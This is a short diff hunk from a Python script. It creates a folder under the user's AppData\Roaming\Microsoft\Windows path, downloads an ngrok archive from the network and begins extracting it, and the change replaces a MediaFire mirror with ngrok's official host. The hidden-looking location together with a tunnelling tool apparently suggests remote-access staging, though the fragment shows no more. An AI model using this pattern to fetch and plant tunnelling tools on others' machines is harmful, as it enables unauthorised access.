@@ -43,7 +43,7 @@ user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 os.makedirs(target_path, exist_ok=True)
 
-r = requests.get("https://download1323.mediafire.com/1phwqyuegg9gNcT8Oeb-1loZjrNgONDRNq5ntVrC1PiuZqqb1ZcvQguAlJQzM_t9C3B64VE0ayu9N0VVWSoR0xBZTOKc_FFAlflmvrX7GJQKgIAN0tQ4yn8EZ_92wnGsX9sSA2Ylaox7G-K046kdZRpV8NzsHAcSadEKhn0xjQ/9x07e1528196942/ngrok-v3-stable-windows-amd64.zip", allow_redirects=True)
+r = requests.get("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip", allow_redirects=True)
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ngrok-v3-stable-windows-amd64.zip')
 open(file_path, 'wb').write(r.content)
 with zipfile.ZipFile(file_path, 'r') as zip_ref:
